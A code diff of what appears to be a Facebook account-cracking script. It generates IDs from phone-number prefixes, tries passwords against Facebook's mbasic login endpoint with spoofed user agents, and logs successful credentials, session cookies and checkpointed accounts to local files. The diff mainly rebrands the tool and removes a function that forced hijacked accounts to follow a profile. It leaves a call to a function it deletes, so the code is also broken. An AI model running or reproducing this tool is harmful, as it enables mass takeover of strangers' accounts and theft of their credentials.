@@ -18,39 +18,9 @@ except ModuleNotFoundError:
     os.system('pip install mechanize requests futures bs4==2 > /dev/null')
     os.system('pip install bs4')
     
-def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
-    else:
-        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        else:
-            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
-    else:
-        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print('')
-
-def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015505571938', {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
-        get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://mbasic.facebook.com' + str(get), {
-            'cookie': coki }, **('cookies',)).text          
- 
+#####APK#####
+            
+            
  
 class jalan:
     def __init__(self, z):
@@ -89,7 +59,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-os.system('')
+os.system('xdg-open https://facebook.com/groups/554714119911648/')
 logo =("""\033[0;92m
 \033[1;32m╔══════════════════════════════════════════════════════════╗\033[1;93m
 \033[1;32m║	         \033[1;93m ─━<🌺Assalamu Alaikum🌺>━─\033[1;32m	           ║
@@ -181,10 +151,10 @@ def xxr():
     print(logo)
     print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
     print(" ══════════════════════════════════════════")
-    rk1 = '0189'
-    rk2 = '0186'
-    rk3 = '0179'
-    rk4= '017'
+    rk1 = '0181'
+    rk2 = '0182'
+    rk3 = '0183'
+    rk4 = '018'
     code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
     os.system('clear')
     print(logo)
@@ -253,28 +223,28 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': "Mozilla/5.0 (Linux; Android 8.1.0; Hisense Infinity H12 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/352.0.0.14.108;]"}
+            'user-agent': "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36"}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[Hasan-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[Tutul-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/Hasan-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/Tutul-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\r\r\33[1;31m [Hasan-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/Hasan-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                #print('\r\r\33[1;30m[Tutul-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
+                open('/sdcard/Tutul-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s {x}[{xr}Hasan {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x}[{xr}Tutul{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
